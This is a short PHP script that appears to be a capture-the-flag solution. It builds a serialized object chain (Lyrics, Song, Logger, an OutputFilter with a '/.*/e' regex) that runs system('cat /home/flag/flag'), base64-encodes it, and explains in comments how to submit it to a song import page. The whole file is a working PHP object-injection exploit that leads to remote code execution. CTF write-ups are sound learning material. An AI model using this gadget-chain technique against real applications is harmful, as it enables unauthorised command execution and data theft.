<?PHP
require_once 'classes.php';

$of = new OutputFilter('/.*/e', "system('cat /home/flag/flag')");
$logger = new Logger(new LogWriter_File("song_views", new LogFileFormat(array($of), "hell")));

// You had to patch the Song constructor to take a logger and set $this->logger=$logger
// or you could have changed `protected $logger` to `public $logger` and edited the serialized
// output to say that the field is protected, and not public.
$song = new Song("hello", "supper", "http:///", $logger);
$lyrics = new Lyrics("wat", $song);
$ser = serialize($lyrics);
print base64_encode($ser) . "\n\n";
// Then submit the base64'd blob into the song import page.
?>
